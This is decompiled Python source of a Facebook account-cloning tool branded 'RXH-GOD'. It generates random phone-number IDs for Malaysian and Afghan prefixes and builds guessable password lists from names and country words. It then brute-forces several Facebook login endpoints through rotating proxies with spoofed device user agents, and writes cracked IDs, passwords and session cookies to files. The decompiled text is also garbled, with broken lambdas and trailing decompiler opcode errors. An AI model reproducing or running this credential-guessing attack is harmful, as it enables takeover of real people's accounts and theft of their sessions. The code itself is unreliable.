    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    clear()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(8)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  {G}:{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID {G}:{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE {G}:{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m MALAYSIA RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + love
            psd = [
                ids,
                love,
                ids[:8],
                ids[:7],
                ids[:6],
                'Malaysia',
                'malaysia']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % ok)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def _Afg_():
    clear()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G1} +9330{G}/{G1}+9340{G}/{G1}+9350{G}/{G1}+9360 ''')
    linex()
    code = input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G2} ''')
    clear()
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999''')
    linex()
    limit = int(input(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m CHOICE  {G}:{G4} '''))
    for x in range(limit):
        nmp = (lambda .0: for _ in .0:
random.choice(string.digits)None)(range(7)())
        user.append(nmp)
        clear()
        sexy = tred(max_workers = 30)
        clear()
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m SIM CODE  {G}:{G1} {code}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL UID {G}:{G2} {str(len(user))}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TODAY DATE {G}:{G2} {date}''')
        print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN''')
        print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m AFGHANISTAN RANDOM CLONING PROCESSING ')
        linex()
        for love in user:
            ids = code + love
            psd = [
                love,
                ids,
                'afghan',
                'afghan12345',
                'afghan123',
                '600700',
                'afghanistan',
                'afghan1122',
                '500500',
                '100200',
                '10002000',
                '900900',
                'kabul123',
                'Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹',
                'Û±Û³Û³Û³ÛµÛ¶',
                'afghan1234',
                'kabul1234',
                'khankhan',
                'khan123',
                'khan123456',
                'khan786']
            sexy.submit(randm, ids, psd)
            None(None, None)
            if not ''.join:
                pass
    print('')
    print(f'''\r{A}──────────────────────────────────────────────────''')
    print('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m THE PROCESS HAS BEEN COMPLETED')
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL OK ID {G}:{G2} %s ''' % ok)
    print(f'''\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m TOTAL CP ID {G}:{G3} %s ''' % cp)
    print(f'''\r{A}──────────────────────────────────────────────────''')
    input('\x1b[1;31m[\x1b[1;32m✓\x1b[1;31m]\x1b[1;37m PRESS ENTER TO BACK ')
    menu()


def setting():
    linex()
    print(' [\x1b[36m1\x1b[1;37m] OLD IDZ')
    print(' [\x1b[36m2\x1b[1;37m] NEW IDZ')
    print(' [\x1b[36m3\x1b[1;37m] MIX IDZ')
    linex()
    hu = input(' [\x1b[36m•\x1b[1;37m] CHOOSE : ')
    if hu in ('1', '01'):
        for tua in sorted(id):
            id2.append(tua)
            if hu in ('2', '02'):
                muda = []
                for bacot in sorted(id):
                    muda.append(bacot)
                    bcm = len(muda)
                    bcmi = bcm - 1
                    for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -= 1
                        if hu in ('3', '03'):
                            for bacot in id:
                                xx = random.randint(0, len(id2))
                                id2.insert(xx, bacot)
                                for bacot in id:
                                    xx = random.randint(0, len(id2))
                                    id2.insert(xx, bacot)
                                    linex()
                                    print(' [\x1b[36m•\x1b[1;37m] LOGIN METHOD ')
                                    linex()
                                    print(' [\x1b[36m1\x1b[1;37m] METHOD 1')
                                    print(' [\x1b[36m2\x1b[1;37m] METHOD 2')
                                    linex()
                                    hc = input(' [\x1b[36m•\x1b[1;37m] CHOOSE : ')
                                    if hc in ('1', '01'):
                                        method.append('mobile')
    if hc in ('4', '04'):
        method.append('free')
    method.append('mobile')
    passwrd()
    exit()


def passwrd():
    os.system('clear')
    banner()
    info()
    print(' [\x1b[36m•\x1b[1;37m] TOTAL IDz : \x1b[36m', str(len(id)))
    print(f''' [\x1b[36m•\x1b[1;37m] YOUR IP ADDRESS : \x1b[36m{ipadd}''')
    print(' \x1b[1;37m[\x1b[36m•\x1b[1;37m] YOU STARTED CLONING AT : ' + time.strftime('%H:%M') + ' ' + tag)
    linex()
    print(' \x1b[36m>> \x1b[1;37m️USE FLIGHT MODE AFTER 5 MINUTES ')
    linex()
    pool = tred(max_workers = 30)
    for yuzong in id2:
        nmf = yuzong.split('|')[1].lower()
        idf = yuzong.split('|')[0]
        frs = nmf.split(' ')[0]
        lst = nmf.split(' ')[1]
        lst = ''
        pwv = []
        if len(nmf) < 6:
            if len(frs) < 3:
                pass
            pwv.append(nmf)
            pwv.append(frs + lst)
            pwv.append(frs + '@' + lst)
            pwv.append(frs + '#' + lst)
            pwv.append(lst + frs)
            pwv.append(frs + '12')
            pwv.append(frs + '123')
            pwv.append(frs + '321')
            pwv.append(frs + '1234')
            pwv.append(frs + '12345')
            pwv.append(frs + '@123')
            pwv.append(frs + '@1234')
            pwv.append(frs + lst + '123')
            pwv.append(frs + lst + '1234')
            pwv.append(frs + lst + '@123')
            pwv.append(frs + lst + '@1234')
            pwv.append(frs + lst + '321')
            pwv.append(lst + frs + '123')
            pwv.append(lst + frs + '111')
        if len(frs) < 3:
            pwv.append(nmf)
        pwv.append(nmf)
        pwv.append(frs + '@@')
        pwv.append(frs + '123')
        pwv.append(frs + '123@')
        pwv.append(frs + '123@@@')
        pwv.append(frs + '1234')
        pwv.append(frs + '1234@')
        pwv.append(frs + '12345')
        pwv.append(frs + '123456')
        pwv.append(frs + '@123')
        pwv.append(frs + '@@123')
        pwv.append(frs + '@1234')
        pwv.append(frs + '@12345')
        pwv.append(frs + '@123456')
        if 'ya' in pwpluss:
            for xpwd in pwnya:
                pwv.append(xpwd)
                if 'mobile' in method:
                    pool.submit(crack, idf, pwv)
        if 'free' in method:
            pool.submit(crackfree, idf, pwv)
        if 'touch' in method:
            pool.submit(cracktouch, idf, pwv)
        if 'free' in method:
            pool.submit(crackfree, idf, pwv)
        pool.submit(crackmbasic, idf, pwv)
        None(None, None)
        if not None:
            pass
    print('\n\x1b[1;37m----------------------------------------------')
    print(' [\x1b[36m•\x1b[1;37m] CLONING COMPLETE AT ' + time.strftime('%H:%M') + ' ' + tag)
    print(' [\x1b[36m•\x1b[1;37m] OK : %s ' % ok)
    print(' [\x1b[36m•\x1b[1;37m] CP : %s ' % cp)
    linex()
    woi = input(' \x1b[36m>>\x1b[1;37m ENTER TO BACK')
    exit()


def crack(idf, pwv):
    global ok, cp, loop
    bo = random.choice([
        m,
        k,
        h,
        b,
        u,
        x])
    (sys.stdout.write(f'''\r {P}[RXH-GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        nip = random.choice(prox)
        proxs = {
            'http': 'socks4://' + nip }
        link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=266003681172790&kid_directed_site=0&app_id=266003681172790&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&rtime=1702051010&hrc=1&wtsid=rdr_03CkC8hTBPuvnU7RM&_rdr')
        data = {
            'bi_xrwh': 0 }
        headers = {
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'viewport-width': '980' }
        po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=266003681172790&auth_token=163217a672b552df614d575382df8cc6&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv11.0%2Fdialog%2Foauth%3Fclient_id%3D266003681172790%26redirect_uri%3Dhttps%253A%252F%252Fapp.heylink.me%252Flogin%252Ffacebook%26state%3Dfbloginheylinkme%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5327ef2a-17a4-41a6-ba33-aa8acdda0343%26tp%3Dunspecified&refsrc=deprecated&app_id=266003681172790&cancel=https%3A%2F%2Fapp.heylink.me%2Flogin%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Dfbloginheylinkme%23_%3D_&lwv=100', data = data, headers = headers, allow_redirects = False, proxies = proxs)
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r{P}{H} [RxH-OK] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\x1b[1;31m{kuki}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
            open('/sdcard/RxH-OK.txt', 'a').write(idf + ' | ' + pw + ' | ' + kuki + '\n')
            jones(idf, pw, kuki)
            ';'.join
        if 'checkpoint' in po.cookies.get_dict().keys():
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            open('/sdcard/RxH-CP.txt', 'a').write(idf + ' | ' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1
            '?1'
        if requests.exceptions.ConnectionError:
            'sec-fetch-user'
            time.sleep(31)
        loop += 1
        return None


def crackfree(idf, pwv):
    global cp, ok, loop
    (sys.stdout.write(f'''\r {P}[RXH-GOD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop / float(len(id)))}{P}]  '''),)
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        ses.headers.update({
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'sec-ch-ua-mobile': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://p.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' })
        p = ses.get('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
        dataa = {
            'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
            'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw }
        koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.cookies.get_dict().items()())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = {
            'Host': 'www.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://p.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
        po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
        if 'checkpoint' in po.cookies.get_dict().keys():
            print(f'''\r{P}{K} [{time.strftime('RXH GOD')}-CP] {idf} │ {pw} {P}''')
            open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
            akun.append(idf + '|' + pw)
            cp += 1
            ';'.join
        if 'c_user' in ses.cookies.get_dict().keys():
            ok += 1
            coki = po.cookies.get_dict()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.cookies.get_dict().items()())
            print(f'''\r{P}{H} [{time.strftime('RXH GOD')}-OK] {idf} │ {pw} {P}''')
            open('OK/' + okc, 'a').write(idf + '|' + pw + '\n')
            jones(idf, pw, kuki)
            ok.append(wrt)
            ';'.join
        if requests.exceptions.ConnectionError:
            time.sleep(31)
        loop += 1
        return None


def randm(ids, psd):
    global loop
    redmi = random.choice([
        '2201116SI',
        'M2012K11AI',
        '22011119TI',
        '21091116UI',
        'M2102K1AC',
        'M2012K11I',
        '22041219I',
        '22041216I',
        '2203121C',
        '2106118C',
        '2201123G',
        '2203129G',
        '2201122G',
        '2201122C',
        '2206122SC',
        '22081212C',
        '2112123AG',
        '2112123AC',
        '2109119BC',
        'M2002J9G',
        'M2007J1SC',
        'M2007J17I',
        'M2102J2SC',
        'M2007J3SY',
        'M2007J17G',
        'M2007J3SG',
        'M2011K2G',
        'M2101K9AG',
        'M2101K9R',
        '2109119DG',
        'M2101K9G',
        '2109119DI',
        'M2012K11G',
        'M2102K1G',
        '21081111RG',
        '2107113SG',
        '21051182G',
        'M2105K81AC',
        'M2105K81C',
        '21061119DG',
        '21121119SG',
        '22011119UY',
        '21061119AG',
        '21061119AL',
        '22041219NY',
        '22041219G',
        '21061119BI',
        '220233L2G',
        '220233L2I',
        '220333QNY',
        '220333QAG',
        'M2004J7AC',
        'M2004J7BC',
        'M2004J19C',
        'M2006C3MII',
        'M2010J19SI',
        'M2006C3LG',
        'M2006C3LVG',
        'M2006C3MG',
        'M2006C3MT',
        'M2006C3MNG',
        'M2006C3LII',
        'M2010J19SL',
        'M2010J19SG',
        'M2010J19SY',
        'M2012K11AC',
        'M2012K10C'])
    uam = '[FBAN/FB4A;FBAV/' + str(random.randint(111, 999)) + '.0.0.' + str(random.randint(1111, 9999)) + ';FBBV/' + str(random.randint(1111111, 9999999)) + ';[FBAN/FB4A;FBAV/' + str(random.randint(40, 100)) + '.0.0.' + str(random.randint(1, 66)) + '.119;FBBV/' + str(random.randint(111111111, 666666666)) + ';FBDM/{density=2.0,width=720,height=1440};FBLC/en_US;FBRV/' + str(random.randint(111111111, 666666666)) + ';FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/' + str(redmi) + ';FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    (sys.stdout.write(f'''\r\x1b[1;31m[\x1b[1;32mRUSTAP-RNDM\x1b[1;31m] \x1b[1;37m{len(id)}\x1b[1;37m \x1b[1;32m|\x1b[1;32m OK{A}/{R}CP \x1b[1;37m|\x1b[1;32m {G}{ok}/{R}{cp} '''),)
    sys.stdout.flush()
    for pas in psd:
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32' }
        url = 'https://b-graph.facebook.com/auth/login'
        po = requests.post(url, data = data, headers = head, allow_redirects = False).text
        q = json.loads(po)
        if 'access_token' in q:
            uid = str(q['uid'])
            ckkk = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(q['session_cookies']())
            RXHb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
            cookie = f'''sb={RXHb};{ckkk}'''
            print(f'''\r\r\x1b[1;31m[\x1b[1;32mRXH-OK\x1b[1;31m]\x1b[1;32m {uid} | {pas}''')
            open('/sdcard/RXH-RNDM-OK.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
            ok.append(uid)
            ';'.join
        if 'www.facebook.com' in q['error']['message']:
            print(f'''\r\r{M}[RXH-CP] {uid} | {pas} ''')
            open('/sdcard/RXH-RNDM-CP.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
            cps.append(uid)
        loop += 1
        return None
        if requests.exceptions.ConnectionError:
            'True'
            randm(ids, psd)
            return None

if __name__ == '__main__':
    os.mkdir('OK')
    os.mkdir('CP')
    os.mkdir('data')
    os.system('touch .prox.txt')
    login()
    return None

Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: SWAP
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: BEFORE_WITH
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: WITH_EXCEPT_START
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: RERAISE
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: CHECK_EXC_MATCH
Unsupported opcode: COPY
Unsupported opcode: RERAISE
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: PUSH_EXC_INFO
Unsupported opcode: JUMP_BACKWARD
Unsupported opcode: COPY
Unsupported opcode: RERAISE
